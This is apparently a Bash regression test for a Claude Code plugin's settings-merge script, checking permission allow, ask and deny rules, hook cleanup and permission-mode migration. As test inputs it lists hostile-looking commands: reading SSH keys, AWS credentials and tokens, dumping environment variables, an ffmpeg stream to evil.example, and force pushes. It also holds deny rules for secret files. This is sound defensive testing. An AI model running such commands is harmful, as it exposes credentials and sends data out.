#!/usr/bin/env bash
# Prova de regressão do plugin/scripts/merge-settings.js.
#
# O merge existe porque o instalador antigo sobrescrevia o settings.json e quem
# tinha permissões próprias perdia tudo. A partir daí ele virou "as suas chaves
# ganham" — mas até 0.8.0 só `permissions.allow` era mesclado: `deny` e `ask`
# ficavam de fora, então quem JÁ tinha o kit instalado nunca recebia barreira
# nova, só permissão nova. Perder um deny é abrir buraco de segurança, e o
# instalador não avisava.
#
# Uso: bash tests/test-merge-settings.sh [caminho-do-merge.js]
#   Sem argumento testa o script do repo. Passe a versão anterior para ver os
#   casos falharem (é o que prova que o teste testa alguma coisa).
set -uo pipefail
MERGE="${1:-$(cd "$(dirname "$0")/.." && pwd)/plugin/scripts/merge-settings.js}"
[ -f "$MERGE" ] || { echo "não achei o merge: $MERGE"; exit 2; }
command -v node >/dev/null 2>&1 || { echo "sem node — pulando"; exit 0; }

TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT
falhas=0

cat > "$TMP/kit.json" <<'JSON'
{
  "language": "portuguese",
  "theme": "dark",
  "extraKnownMarketplaces": {
    "vamoo-ai": {
      "source": { "source": "github", "repo": "VAMOO-AI/claude-kit-mentorados" },
      "autoUpdate": true
    }
  },
  "permissions": {
    "defaultMode": "auto",
    "allow": ["Bash(ls:*)", "Bash(npm test)", "Bash(git status:*)"],
    "deny": ["Read(**/.env)", "Bash(vercel login:*)"]
  }
}
JSON

# Como fica a máquina de quem instalou o kit meses atrás: modo antigo, poucas
# permissões, nenhum deny, e uma preferência própria que não pode sumir.
#
# O `extraKnownMarketplaces` aqui não é invenção do teste: é o que o próprio
# `/plugin marketplace add` escreve no settings.json de quem instalou. Ele é a
# razão de o merge não poder ser tudo-ou-nada nessa chave — a chave JÁ existe,
# então "o seu ganha" significava que o autoUpdate do kit nunca chegava.
#
# Os `hooks` são o que o install.sh de antes da 0.7.0 deixou: ele sobrescrevia o
# settings.json com um que chamava o dispatch do dotcontext no SessionStart e depois
# de todo Write/Edit/Bash — e o merge, que preserva hook seu, preservava esse junto.
# O do Stop é um dispatch que a pessoa configurou por conta própria: não é do kit.
cat > "$TMP/meu.json" <<'JSON'
{
  "theme": "light",
  "statusLine": { "type": "command", "command": "meu-script.sh" },
  "hooks": {
    "SessionStart": [
      { "matcher": "*", "hooks": [
        { "type": "command", "command": "[ \"$PWD\" != \"$HOME\" ] && npx -y @dotcontext/cli@latest hook dispatch --source claude-code || exit 0", "timeout": 60 },
        { "type": "command", "command": "meu-hook.sh" }
      ] }
    ],
    "PostToolUse": [
      { "matcher": "Write|Edit|Bash", "hooks": [
        { "type": "command", "command": "[ \"$PWD\" != \"$HOME\" ] && npx -y @dotcontext/cli@latest hook dispatch --source claude-code || exit 0", "timeout": 60 }
      ] }
    ],
    "Stop": [
      { "hooks": [ { "type": "command", "command": "npx -y @dotcontext/cli@1.2.0 hook dispatch --source claude-code" } ] }
    ]
  },
  "extraKnownMarketplaces": {
    "vamoo-ai": {
      "source": { "source": "directory", "path": "/Users/eu/dev/claude-kit-mentorados" }
    },
    "marketplace-do-meu-time": {
      "source": { "source": "github", "repo": "meu-time/plugins" }
    }
  },
  "permissions": {
    "defaultMode": "default",
    "allow": ["Bash(ls:*)", "Bash(meu-script:*)"]
  }
}
JSON

SAIDA="$(node "$MERGE" "$TMP/kit.json" "$TMP/meu.json" 2>&1)"

# O JSON é lido pelo node, pré-requisito do kit (python não é), e chega pelo stdin, aberto
# pelo bash. No Git Bash o interpretador é nativo do Windows: o /tmp/... escrito dentro do
# código não existe para ele, e o leitor devolvia vazio em todos os casos.
check() { # check <descrição> <expressão JS sobre d> <esperado>
  local got; got="$(node -e "
const d = JSON.parse(require('fs').readFileSync(0, 'utf8'));
process.stdout.write(String(JSON.stringify($2)));
" < "$TMP/meu.json" 2>/dev/null)"
  if [ "$got" = "$3" ]; then printf '  ok    %s\n' "$1"
  else printf '  FALHA %s (esperado %s, veio %s)\n' "$1" "$3" "$got"; falhas=$((falhas+1)); fi
}

echo "== o que o kit precisa entregar =="
check "deny do kit chega em quem já tinha o kit" \
  "(d.permissions.deny || []).length" "2"
check "allow vira união, sem duplicar o que já havia" \
  "d.permissions.allow.length" "4"
check "chave nova do kit é preenchida" "d.language" '"portuguese"'

echo "== o que é seu e não pode ser tocado =="
check "tema que você escolheu continua o seu" "d.theme" '"light"'
check "statusLine própria sobrevive" "d.statusLine.command" '"meu-script.sh"'
check "sua permissão própria continua na lista" \
  "d.permissions.allow.includes('Bash(meu-script:*)')" "true"
check "modo Manual (\"default\") vira o do kit (auto)" \
  "d.permissions.defaultMode" '"auto"'

echo "== o kit precisa se manter atualizado sozinho =="
check "auto-update do kit é ligado em quem já tinha o marketplace" \
  "d.extraKnownMarketplaces['vamoo-ai'].autoUpdate" "true"
check "a fonte que você já tinha NÃO é trocada pela do kit" \
  "d.extraKnownMarketplaces['vamoo-ai'].source.source" '"directory"'
check "marketplace de outro time continua no arquivo" \
  "'marketplace-do-meu-time' in d.extraKnownMarketplaces" "true"
printf '%s' "$SAIDA" | grep -q 'extraKnownMarketplaces.vamoo-ai.autoUpdate' \
  && echo "  ok    a saída nomeia o auto-update que ligou" \
  || { echo "  FALHA a saída não nomeia o auto-update: $SAIDA"; falhas=$((falhas+1)); }

echo "== o hook antigo do dotcontext sai; o resto dos hooks é seu =="
check "o dispatch do dotcontext não sobrevive ao setup" \
  "Object.values(d.hooks || {}).flat().flatMap((g) => g.hooks || []).map((h) => h.command).filter((c) => c.includes('@dotcontext/cli@latest hook dispatch'))" "[]"
check "hook seu no mesmo grupo continua" \
  "d.hooks.SessionStart.flatMap((g) => g.hooks).map((h) => h.command)" '["meu-hook.sh"]'
check "evento que só tinha o dispatch some, sem grupo vazio" "'PostToolUse' in d.hooks" "false"
check "dispatch que você configurou de outro jeito fica" \
  "d.hooks.Stop[0].hooks[0].command" '"npx -y @dotcontext/cli@1.2.0 hook dispatch --source claude-code"'

echo "== quem desligou o auto-update de propósito não é religado =="
cat > "$TMP/desligado.json" <<'JSON'
{
  "extraKnownMarketplaces": {
    "vamoo-ai": {
      "source": { "source": "github", "repo": "VAMOO-AI/claude-kit-mentorados" },
      "autoUpdate": false
    }
  }
}
JSON
SAIDA_OFF="$(node "$MERGE" "$TMP/kit.json" "$TMP/desligado.json" 2>&1)"
node -e "
const d = JSON.parse(require('fs').readFileSync(0, 'utf8'));
process.exit(d.extraKnownMarketplaces['vamoo-ai'].autoUpdate === false ? 0 : 1);
" < "$TMP/desligado.json" 2>/dev/null \
  && echo "  ok    autoUpdate:false continua false" \
  || { echo "  FALHA o kit religou um auto-update que a pessoa desligou"; falhas=$((falhas+1)); }
printf '%s' "$SAIDA_OFF" | grep -qi 'auto-update' \
  && echo "  ok    avisa que manteve a escolha da pessoa" \
  || { echo "  FALHA não avisou sobre o auto-update desligado: $SAIDA_OFF"; falhas=$((falhas+1)); }

echo "== quem nunca teve marketplace nenhum ganha o bloco inteiro =="
echo '{}' > "$TMP/zerado.json"
node "$MERGE" "$TMP/kit.json" "$TMP/zerado.json" >/dev/null 2>&1
node -e "
const d = JSON.parse(require('fs').readFileSync(0, 'utf8'));
const m = (d.extraKnownMarketplaces || {})['vamoo-ai'] || {};
process.exit(m.autoUpdate === true && (m.source || {}).repo === 'VAMOO-AI/claude-kit-mentorados' ? 0 : 1);
" < "$TMP/zerado.json" 2>/dev/null \
  && echo "  ok    fonte e auto-update chegam juntos" \
  || { echo "  FALHA settings zerado não recebeu o marketplace do kit"; falhas=$((falhas+1)); }
node -e "
process.exit('hooks' in JSON.parse(require('fs').readFileSync(0, 'utf8')) ? 1 : 0);
" < "$TMP/zerado.json" 2>/dev/null \
  && echo "  ok    settings sem hooks não ganha a chave" \
  || { echo "  FALHA a limpeza do hook antigo criou a chave hooks em quem não tinha"; falhas=$((falhas+1)); }

echo "== o instalador precisa dizer o que fez =="
printf '%s' "$SAIDA" | grep -q 'permissions.deny (+2)' \
  && echo "  ok    a saída nomeia as barreiras acrescentadas" \
  || { echo "  FALHA a saída não nomeia o deny acrescentado: $SAIDA"; falhas=$((falhas+1)); }
printf '%s' "$SAIDA" | grep -q 'pra voltar ao manual de vez' \
  && printf '%s' "$SAIDA" | grep -q 'manter-modo-manual' \
  && echo "  ok    diz que trocou o modo e como voltar (com o marcador)" \
  || { echo "  FALHA não explicou a troca de modo nem como voltar: $SAIDA"; falhas=$((falhas+1)); }
printf '%s' "$SAIDA" | grep -q 'removido: hook antigo do dotcontext (2)' \
  && echo "  ok    a saída nomeia o hook antigo que tirou" \
  || { echo "  FALHA a saída não nomeia a remoção do hook antigo: $SAIDA"; falhas=$((falhas+1)); }

echo "== rodar duas vezes não pode mudar nada =="
ANTES="$(cat "$TMP/meu.json")"
node "$MERGE" "$TMP/kit.json" "$TMP/meu.json" >/dev/null 2>&1
[ "$ANTES" = "$(cat "$TMP/meu.json")" ] \
  && echo "  ok    idempotente" \
  || { echo "  FALHA a segunda passada mudou o arquivo"; falhas=$((falhas+1)); }

echo "== o deny do template cobre supabase/vercel por qualquer runner =="
TEMPLATE="$(cd "$(dirname "$0")/.." && pwd)/plugin/templates/settings.json"
# Em bypass o deny é o único freio, e ele casa por prefixo: `supabase db push:*` não pega
# `npx -y supabase@latest db push`, `bunx supabase …` nem `pnpm dlx supabase …` (issue #137).
# Todo deny de supabase/vercel precisa da forma com curinga em cada runner.
SEM_RUNNER="$(node -e '
const d = require(process.argv[1]).permissions.deny
const rs = ["npx","bunx","bun","pnpx","pnpm","npm","yarn"]
const falta = []
for (const e of d) {
  const m = e.match(/^Bash\((supabase|vercel) (.*):\*\)$/)
  if (!m) continue
  for (const r of rs) { const n = `Bash(${r} *${m[1]}* ${m[2]} *)`; if (!d.includes(n)) falta.push(n) }
}
console.log(falta.join(" "))' "$TEMPLATE")"
if [ -z "$SEM_RUNNER" ]; then echo "  ok    todo deny de supabase/vercel cobre os runners (npx, bunx, pnpm…)"
else echo "  FALHA deny sem a forma por runner: $SEM_RUNNER"; falhas=$((falhas+1)); fi

# O glob do deny é quase o do `case` do bash; a diferença é o ` *` final, que o matcher do
# Claude Code também aceita sem argumento nenhum, mas SÓ quando é o único curinga da regra
# (code.claude.com/docs/en/permissions#wildcard-patterns: `Bash(* --help *)` não casa
# `npm --help`). `Bash(npx *supabase* db push *)` tem três curingas e não pega
# `npx supabase db push`; quem pega é o gêmeo sem o ` *` final (issue #249). Até a 0.61.1 este
# teste aceitava o comando sem argumento em qualquer regra e dava verde sem cobertura. O
# sufixo é ` *`, não `*`: `link*` pegava `functions deploy link-preview`.
PADROES="$(node -e 'for (const e of require(process.argv[1]).permissions.deny)
  if (e.startsWith("Bash(") && !e.endsWith(":*)")) console.log(e.slice(5, -1))' "$TEMPLATE")"
negado() {
  local p; while IFS= read -r p; do
    [ -z "$p" ] && continue
    # shellcheck disable=SC2254  # o padrão é glob de propósito
    case "$1" in $p) return 0 ;; esac
    case "$p" in *' *') case "${p% \*}" in *'*'*) ;; *) [ "$1" = "${p% \*}" ] && return 0 ;; esac ;; esac
  done <<< "$PADROES"; return 1
}
for c in 'npx supabase db push' 'npx -y supabase@latest db push --linked' 'bunx supabase db push' \
         'pnpm dlx supabase link --project-ref x' 'pnpm exec supabase login' 'yarn dlx vercel@latest login' \
         'npm exec -- supabase db push' 'bun x supabase login' 'npx vercel login'; do
  if negado "$c"; then echo "  ok    deny pega: $c"; else echo "  FALHA deny não pega: $c"; falhas=$((falhas+1)); fi
done
for c in 'npx supabase db reset' 'npx supabase migration new link_table' 'npx supabase unlink' 'pnpm test' \
         'npx supabase functions deploy link-preview' 'npx supabase functions deploy login-handler' \
         'pnpm exec supabase functions deploy link-preview' 'pnpm dlx supabase functions deploy login-handler' \
         'yarn dlx supabase migration new link_table' 'npm exec supabase functions deploy linkedin-sync'; do
  if negado "$c"; then echo "  FALHA deny pega rotina: $c"; falhas=$((falhas+1)); else echo "  ok    deny deixa: $c"; fi
done
# Invariante do #249: todo padrão de deny ou ask com mais de um curinga que termina em ` *`
# tem o gêmeo sem o ` *` final, em Bash e em PowerShell (a doc diz que as regras PowerShell
# têm "the same shape as Bash rules"). Os casos acima só cobrem o gêmeo que tem caso; este
# cobre todos, inclusive o do próximo padrão que entrar.
SEM_GEMEO="$(node -e '
const p = require(process.argv[1]).permissions
const falta = []
for (const l of ["deny", "ask"]) {
  const lista = p[l] || []
  for (const r of lista) {
    const m = /^(Bash|PowerShell)\(([\s\S]*) \*\)$/.exec(r)
    if (!m || !m[2].includes("*")) continue
    const g = `${m[1]}(${m[2]})`
    if (!lista.includes(g)) falta.push(`${l}:${g}`)
  }
}
console.log(falta.join("\n"))' "$TEMPLATE")"
if [ -z "$SEM_GEMEO" ]; then echo "  ok    todo padrão com mais de um curinga que termina em ' *' tem o gêmeo"
else echo "  FALHA falta o gêmeo sem o ' *' final ($(printf '%s\n' "$SEM_GEMEO" | wc -l | tr -d ' ')): $(printf '%s\n' "$SEM_GEMEO" | head -3 | tr '\n' ' ')…"; falhas=$((falhas+1)); fi

# `Read(**/.env.*)` bloquearia o .env.example, que é commitado e lido de propósito; os
# arquivos de ambiente com segredo vão enumerados.
# Âncora `//` (raiz do disco), não `**/` solto: "a rule only matches files under its anchor",
# e sem âncora a regra só vale abaixo da pasta do projeto. Medido em 15/10/2026 (espelho de
# VAMOO-AI/claude-config-team#332): com `Read(**/.env.local)`, `cat` num .env.local falso FORA
# do projeto leu em bypass; com `Read(//**/.env.local)` foi negado nos dois modos.
for e in .env .env.local .env.production .env.development .env.staging .env.tokens; do
  if node -e 'process.exit(require(process.argv[1]).permissions.deny.includes(process.argv[2]) ? 0 : 1)' \
       "$TEMPLATE" "Read(//**/$e)"; then echo "  ok    deny de leitura: $e (ancorado em //)"
  else echo "  FALHA falta deny de leitura ancorado: Read(//**/$e)"; falhas=$((falhas+1)); fi
done
if node -e 'process.exit(require(process.argv[1]).permissions.deny.some(r => r.startsWith("Read(**")) ? 0 : 1)' "$TEMPLATE"; then
  echo "  FALHA regra Read(**/…) sem âncora: só vale abaixo da pasta do projeto"; falhas=$((falhas+1))
else echo "  ok    toda regra Read de segredo é ancorada na raiz (//)"; fi

echo "== modo de permissão: Manual, ausente e acceptEdits viram auto; o resto fica =="
# Pedido do Ruan (10/10/2026): mentorado não fica no manual pedindo "Permitir" a cada
# edição. Até a 0.47.x o kit só avisava; quem estava em "default" continuava lá. Da 0.48.0
# à 0.55.0 o destino era acceptEdits; desde a 0.56.0 (decisão de 18/10/2026) é auto. Na
# 0.56.0 quem já estava em acceptEdits só ganhava aviso; desde a 0.56.1 (decisão de
# 19/10/2026) vira auto também, salvo o marcador kit-vamoo/manter-accept-edits — ou o
# manter-modo-manual, que promete "o setup não troca mais o seu modo".
modo_apos() { # modo_apos <modo-inicial|-> [marcador|marcador-accept] → imprime o defaultMode final
  local dir="$TMP/modo-$RANDOM$RANDOM"; mkdir -p "$dir"
  if [ "$1" = "-" ]; then echo '{"permissions":{}}' > "$dir/settings.json"
  else printf '{"permissions":{"defaultMode":"%s"}}\n' "$1" > "$dir/settings.json"; fi
  [ "${2:-}" = marcador ] && { mkdir -p "$dir/kit-vamoo"; : > "$dir/kit-vamoo/manter-modo-manual"; }
  [ "${2:-}" = marcador-accept ] && { mkdir -p "$dir/kit-vamoo"; : > "$dir/kit-vamoo/manter-accept-edits"; }
  node "$MERGE" "$TMP/kit.json" "$dir/settings.json" > "$dir/saida.txt" 2>&1
  node -e 'const m=require(process.argv[1]).permissions.defaultMode; console.log(m===undefined?"(nenhum)":m)' "$dir/settings.json"
  ULTIMO_DIR="$dir"
}
esperado() { # esperado <descrição> <obtido> <esperado>
  if [ "$2" = "$3" ]; then echo "  ok    $1"; else echo "  FALHA $1 (esperado $3, veio $2)"; falhas=$((falhas+1)); fi
}
esperado "sem modo nenhum vira auto" "$(modo_apos -)" "auto"
esperado "default vira auto" "$(modo_apos default)" "auto"
for m in auto bypassPermissions plan dontAsk; do
  esperado "$m é mantido" "$(modo_apos "$m")" "$m"
done
esperado "acceptEdits vira auto" "$(modo_apos acceptEdits)" "auto"
modo_apos acceptEdits >/dev/null
grep -qF 'Accept edits ("acceptEdits") → "auto"' "$ULTIMO_DIR/saida.txt" && grep -q 'manter-accept-edits' "$ULTIMO_DIR/saida.txt" \
  && echo "  ok    a saída diz que saiu do acceptEdits e como voltar (com o marcador)" \
  || { echo "  FALHA a troca do acceptEdits não explica o que mudou nem como voltar: $(cat "$ULTIMO_DIR/saida.txt")"; falhas=$((falhas+1)); }
ANTES_AE="$(cat "$ULTIMO_DIR/settings.json")"
SEGUNDA_AE="$(node "$MERGE" "$TMP/kit.json" "$ULTIMO_DIR/settings.json" 2>&1)"
[ "$ANTES_AE" = "$(cat "$ULTIMO_DIR/settings.json")" ] && ! printf '%s' "$SEGUNDA_AE" | grep -q 'modo de permissão' \
  && echo "  ok    depois de migrar o acceptEdits, a segunda passada fica calada" \
  || { echo "  FALHA segunda passada depois do acceptEdits mexeu ou anunciou: $SEGUNDA_AE"; falhas=$((falhas+1)); }
esperado "marcador kit-vamoo/manter-accept-edits segura o acceptEdits" "$(modo_apos acceptEdits marcador-accept)" "acceptEdits"
modo_apos acceptEdits marcador-accept >/dev/null
grep -q 'porque existe .*manter-accept-edits' "$ULTIMO_DIR/saida.txt" \
  && echo "  ok    com o marcador a saída diz que manteve o Accept edits" \
  || { echo "  FALHA com o marcador a saída não explica: $(cat "$ULTIMO_DIR/saida.txt")"; falhas=$((falhas+1)); }
esperado "manter-modo-manual também segura o acceptEdits" "$(modo_apos acceptEdits marcador)" "acceptEdits"
esperado "manter-accept-edits não segura o Manual (cada marcador vale para o seu modo)" "$(modo_apos default marcador-accept)" "auto"
for m in auto bypassPermissions plan dontAsk; do
  modo_apos "$m" >/dev/null
  if grep -q 'modo de permissão' "$ULTIMO_DIR/saida.txt"; then
    echo "  FALHA $m mantido, mas a saída fala do modo: $(cat "$ULTIMO_DIR/saida.txt")"; falhas=$((falhas+1))
  else echo "  ok    $m mantido em silêncio"; fi
done
modo_apos - >/dev/null
grep -q 'abre em Manual' "$ULTIMO_DIR/saida.txt" \
  && echo "  ok    a troca para auto avisa que sem Auto disponível a sessão abre em Manual" \
  || { echo "  FALHA a troca para auto não explica o fallback: $(cat "$ULTIMO_DIR/saida.txt")"; falhas=$((falhas+1)); }
esperado "marcador kit-vamoo/manter-modo-manual segura o default" "$(modo_apos default marcador)" "default"
esperado "marcador também segura quem não tem modo" "$(modo_apos - marcador)" "(nenhum)"
modo_apos default marcador >/dev/null
grep -q 'mantive o manual' "$ULTIMO_DIR/saida.txt" \
  && echo "  ok    com marcador a saída diz que manteve o manual" \
  || { echo "  FALHA com marcador a saída não explica: $(cat "$ULTIMO_DIR/saida.txt")"; falhas=$((falhas+1)); }
modo_apos default >/dev/null
ANTES_MODO="$(cat "$ULTIMO_DIR/settings.json")"
SEGUNDA="$(node "$MERGE" "$TMP/kit.json" "$ULTIMO_DIR/settings.json" 2>&1)"
[ "$ANTES_MODO" = "$(cat "$ULTIMO_DIR/settings.json")" ] && ! printf '%s' "$SEGUNDA" | grep -q 'modo de permissão' \
  && echo "  ok    segunda passada não troca nem anuncia o modo de novo" \
  || { echo "  FALHA segunda passada mexeu no modo: $SEGUNDA"; falhas=$((falhas+1)); }

echo "== regras do template: PowerShell, ask e nada genérico =="
# Matcher igual ao da doc (code.claude.com/docs/en/permissions#wildcard-patterns): `*` casa
# qualquer texto; o ` *` final casa também o comando sem argumento, mas SÓ quando é o único
# curinga da regra. `git push * --force *` não pega `git push origin x --force`.
casa() { # casa <lista allow|ask|deny> <Ferramenta> <comando> → 0 se alguma regra casa
  node -e '
const [tpl, lista, tool, cmd] = process.argv.slice(1)
const regras = require(tpl).permissions[lista] || []
const pref = tool + "("
const ok = regras.some((r) => {
  if (!r.startsWith(pref) || !r.endsWith(")")) return false
  let p = r.slice(pref.length, -1)
  if (p.endsWith(":*")) p = p.slice(0, -2) + " *"
  const so1 = (p.match(/\*/g) || []).length === 1
  const esc = (t) => t.replace(/[.+?^${}()|[\]\\]/g, "\\$&").replace(/\*/g, "[\\s\\S]*")
  const re = so1 && p.endsWith(" *") ? "^" + esc(p.slice(0, -2)) + "( [\\s\\S]*)?$" : "^" + esc(p) + "$"
  return new RegExp(re, tool === "PowerShell" ? "i" : "").test(cmd)
})
process.exit(ok ? 0 : 1)' "$TEMPLATE" "$1" "$2" "$3"
}
for tool in Bash PowerShell; do
  for c in 'git push --force' 'git push origin feat --force' 'git push -f origin feat' 'git push origin feat -f' \
           'git push origin +main' 'git push origin --delete feat' 'git push --mirror' \
           'git push origin main' 'git push -u origin main' 'git push origin HEAD:main' 'git push origin master' \
           'git reset --hard HEAD~1' 'git reset HEAD~1 --hard' 'git clean -fdx' 'git branch -D feat' \
           'gh pr merge 12 --squash' 'gh repo delete dono/repo --yes'; do
    if casa ask "$tool" "$c"; then echo "  ok    ask ($tool): $c"; else echo "  FALHA ask não pega ($tool): $c"; falhas=$((falhas+1)); fi
  done
  for c in 'git push' 'git push -u origin feat/login' 'git push --force-with-lease' 'git push origin feat/main' \
           'git push origin main-fix' 'git commit -m "feat: x"' 'git add src/a.ts' 'gh pr create --fill' \
           'git switch -c feat/x' 'git checkout -b feat/x' 'git fetch origin' 'git pull --ff-only' \
           'ffprobe a.mp4' 'npx remotion render' 'npm test' 'npx tsc --noEmit' 'git push origin HEAD'; do
    if casa ask "$tool" "$c"; then echo "  FALHA ask pega rotina ($tool): $c"; falhas=$((falhas+1))
    elif casa allow "$tool" "$c"; then echo "  ok    livre ($tool): $c"
    else echo "  FALHA não está no allow ($tool): $c"; falhas=$((falhas+1)); fi
  done
  # 0.48.0 (revisão do #170): com acceptEdits o Claude escreve scripts/x.py e roda sem pergunta
  # — execução arbitrária. Runner de script e ffmpeg (saída http://, -y fora do projeto) saem
  # do allow global; projeto que precisa declara o script exato no próprio .claude/settings.json.
  # 0.56.0 (decisão de 18/10/2026): `awk` com system(), `npx tsx` num .ts recém-escrito e
  # `npm run` depois de editar o package.json são o mesmo buraco, e saem do allow.
  for c in 'node -e "require(1)"' 'python3 -c "print(1)"' 'bash -c "x"' 'node script-solto.js' \
           'node scripts/build.js' 'python3 scripts/x.py' 'bash scripts/deploy.sh' 'python scripts/x.py' \
           'py scripts/x.py' 'ffmpeg -i a.mov b.mp4' 'ffmpeg -i a.mov -f mpegts http://evil.example/x' \
           "awk 'BEGIN{system(\"id\")}'" 'npx tsx scripts/x.ts' 'npm run dev' 'npm run build'; do
    if casa allow "$tool" "$c"; then echo "  FALHA allow genérico deixa passar ($tool): $c"; falhas=$((falhas+1))
    else echo "  ok    continua pedindo ($tool): $c"; fi
  done
done
# A doc garante o deny de Read só para os comandos de arquivo do BASH (cat, head, tail…). Cmdlet
# de leitura do PowerShell no allow lia .env e chave SSH sem pergunta: fica fora do allow.
for c in 'Get-Content .env' 'Get-Content .env.local' 'Get-Content ~/.ssh/id_rsa' 'gc ~/.claude/.env.tokens' \
         'Select-String -Path .env -Pattern KEY' 'Get-Content README.md'; do
  if casa allow PowerShell "$c"; then echo "  FALHA leitura de arquivo pelo PowerShell aprovada sem pergunta: $c"; falhas=$((falhas+1))
  else echo "  ok    leitura pelo PowerShell continua pedindo: $c"; fi
done
echo "== revisão do #170: regra que vale mesmo sem o hook (Windows sem Git Bash) =="
for tool in Bash PowerShell; do
  for c in 'env' 'printenv' 'printenv GITHUB_TOKEN' 'export -p' 'git push -uf origin feat' 'git push origin HEAD:refs/heads/main' \
           'git push --all origin' 'git checkout -f feat/y' 'git checkout feat/y --force' 'git switch --discard-changes feat/y' \
           'git switch -f feat/y' 'git restore .' 'git checkout -- .' 'git stash drop' 'git stash clear' \
           'find . -name "*.log" -delete' 'find . -type f -exec rm {} ;' 'cat ~/.ssh/id_ed25519' 'cat ~/.aws/credentials' \
           'cat ~/.claude/.env.tokens' 'cat ~/.config/gh/hosts.yml' 'cat ~/.netrc'; do
    if casa ask "$tool" "$c"; then echo "  ok    ask ($tool): $c"; else echo "  FALHA ask não pega ($tool): $c"; falhas=$((falhas+1)); fi
  done
done
for c in 'Get-ChildItem Env:' 'gci env:' 'ls env:' 'dir Env:' 'Get-Item Env:GITHUB_TOKEN' 'Get-ChildItem -Path Env:' \
         '[Environment]::GetEnvironmentVariables()' 'git diff --no-index NUL $HOME\.ssh\id_ed25519'; do
  if casa ask PowerShell "$c"; then echo "  ok    ask (PowerShell): $c"; else echo "  FALHA ask não pega (PowerShell): $c"; falhas=$((falhas+1)); fi
done
for c in 'ssh -T git@github.com' 'git status' 'npm run build' 'grep -rn "process.env" src' 'git log --oneline -5' 'git restore --staged .'; do
  if casa ask Bash "$c"; then echo "  FALHA ask pega rotina: $c"; falhas=$((falhas+1)); else echo "  ok    rotina não pergunta: $c"; fi
done
RUINS="$(node -e 'for (const l of ["allow","ask","deny"]) for (const r of require(process.argv[1]).permissions[l]||[]) if (/:\*\)$/.test(r) && r.slice(0,-3).includes("*")) console.log(r)' "$TEMPLATE")"
[ -z "$RUINS" ] && echo "  ok    nenhuma regra termina em ':*' com outro curinga (a doc lê como ' *')" \
  || { echo "  FALHA regra que termina em ':*' com outro curinga: $RUINS"; falhas=$((falhas+1)); }
for c in 'Get-ChildItem Env:' 'Get-ChildItem Env:GITHUB_TOKEN'; do
  if casa ask PowerShell "$c"; then echo "  ok    ask (PowerShell): $c"; else echo "  FALHA ask não pega (PowerShell): $c"; falhas=$((falhas+1)); fi
done
grep -q '"Bash(env)"' <(node -e 'console.log(JSON.stringify(require(process.argv[1]).permissions.allow))' "$TEMPLATE") \
  && { echo "  FALHA Bash(env) ainda está no allow do template"; falhas=$((falhas+1)); } || echo "  ok    Bash(env) saiu do allow do template"

echo "== os allows de execução arbitrária que o kit gravou saem de quem os tem =="
# Até a 0.55.0 o template trazia Bash(awk:*), Bash(npx tsx:*), Bash(npm run:*) e os gêmeos
# PowerShell. O allow é união, então tirar do template não tirava de quem já rodou o setup:
# o merge tira o texto exato que o kit gravou e deixa o resto do allow da pessoa.
cat > "$TMP/legado.json" <<'JSON'
{ "permissions": { "defaultMode": "acceptEdits", "allow": ["Bash(ls:*)", "Bash(awk:*)", "Bash(npm run:*)", "Bash(npx tsx:*)", "PowerShell(npm run *)", "PowerShell(npx tsx *)", "Bash(npm run build)", "Bash(meu-script:*)"] } }
JSON
SAIDA_L="$(node "$MERGE" "$TEMPLATE" "$TMP/legado.json" 2>&1)"
for r in 'Bash(awk:*)' 'Bash(npm run:*)' 'Bash(npx tsx:*)' 'PowerShell(npm run *)' 'PowerShell(npx tsx *)'; do
  if node -e 'process.exit(require(process.argv[1]).permissions.allow.includes(process.argv[2]) ? 1 : 0)' "$TMP/legado.json" "$r"; then
    echo "  ok    $r saiu do allow"
  else echo "  FALHA $r continua no allow de quem já tinha o kit"; falhas=$((falhas+1)); fi
done
for r in 'Bash(npm run build)' 'Bash(meu-script:*)' 'Bash(ls:*)'; do
  node -e 'process.exit(require(process.argv[1]).permissions.allow.includes(process.argv[2]) ? 0 : 1)' "$TMP/legado.json" "$r" \
    && echo "  ok    allow seu fica: $r" || { echo "  FALHA o merge tirou um allow que não era do kit: $r"; falhas=$((falhas+1)); }
done
printf '%s' "$SAIDA_L" | grep -qF 'removido do allow: Bash(awk:*), Bash(npm run:*), Bash(npx tsx:*), PowerShell(npm run *), PowerShell(npx tsx *)' \
  && echo "  ok    a saída nomeia os allows que tirou" || { echo "  FALHA a saída não nomeia a remoção: $SAIDA_L"; falhas=$((falhas+1)); }
printf '%s' "$SAIDA_L" | grep -qF '"Bash(npm run build)"' \
  && echo "  ok    a saída ensina a liberar o comando exato no projeto" || { echo "  FALHA a saída não diz como liberar no projeto: $SAIDA_L"; falhas=$((falhas+1)); }
ANTES_L="$(cat "$TMP/legado.json")"
SAIDA_L2="$(node "$MERGE" "$TEMPLATE" "$TMP/legado.json" 2>&1)"
[ "$ANTES_L" = "$(cat "$TMP/legado.json")" ] && ! printf '%s' "$SAIDA_L2" | grep -q 'removido do allow' \
  && echo "  ok    segunda passada não mexe nem anuncia a remoção de novo" \
  || { echo "  FALHA segunda passada mexeu ou repetiu a remoção: $SAIDA_L2"; falhas=$((falhas+1)); }
for r in 'Bash(awk:*)' 'Bash(npm run:*)' 'Bash(npx tsx:*)' 'PowerShell(npm run *)' 'PowerShell(npx tsx *)'; do
  node -e 'process.exit(require(process.argv[1]).permissions.allow.includes(process.argv[2]) ? 1 : 0)' "$TEMPLATE" "$r" \
    && echo "  ok    template não traz $r" || { echo "  FALHA template ainda traz $r"; falhas=$((falhas+1)); }
done
node -e 'process.exit(require(process.argv[1]).permissions.defaultMode === "auto" ? 0 : 1)' "$TEMPLATE" \
  && echo "  ok    template em defaultMode auto" || { echo "  FALHA template fora do auto"; falhas=$((falhas+1)); }

echo "== o setup avisa quando um ask do kit anula um allow seu =="
cat > "$TMP/meu-allow.json" <<'JSON'
{ "permissions": { "defaultMode": "acceptEdits", "allow": ["Bash(git push origin main)", "Bash(env)", "Bash(git status:*)", "Bash(meu-script:*)"] } }
JSON
SAIDA_A="$(node "$MERGE" "$TEMPLATE" "$TMP/meu-allow.json" 2>&1)"
for r in 'Bash(git push origin main)' 'Bash(env)'; do
  printf '%s' "$SAIDA_A" | grep -qF -- "- $r (agora pergunta" && echo "  ok    avisa que $r passa a perguntar" \
    || { echo "  FALHA não avisou de $r: $SAIDA_A"; falhas=$((falhas+1)); }
done
printf '%s' "$SAIDA_A" | grep -qF -- '- Bash(git status:*)' && { echo "  FALHA avisou de allow que nada anula"; falhas=$((falhas+1)); } \
  || echo "  ok    não avisa de allow que nenhum ask anula"
